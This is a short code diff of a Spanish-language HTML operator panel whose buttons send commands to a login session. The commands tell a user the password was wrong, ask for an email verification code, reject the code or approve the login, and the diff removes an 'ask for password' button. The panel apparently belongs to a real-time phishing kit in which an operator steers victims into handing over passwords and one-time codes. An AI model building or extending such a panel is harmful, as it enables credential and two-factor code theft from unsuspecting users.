@@ -207,7 +207,6 @@
         </div>
         <div class="actions-grid">
           <button class="cmd-btn btn-err-login" onclick="sendCmd('${safeId}', 'error_login', 'Contraseña incorrecta. Inténtalo de nuevo.')">❌ Error Login</button>
-          <button class="cmd-btn btn-ask-pass" onclick="sendCmd('${safeId}', 'ask_pass', 'Pedir clave')">➡️ Pedir Clave</button>
           <button class="cmd-btn btn-ask-token" onclick="sendCmd('${safeId}', 'ask_token', 'Pedir código de correo')">📧 Código Correo</button>
           <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código de correo inválido o expirado.')">❌ Error Código Correo</button>
           <button class="cmd-btn btn-approve" onclick="sendCmd('${safeId}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
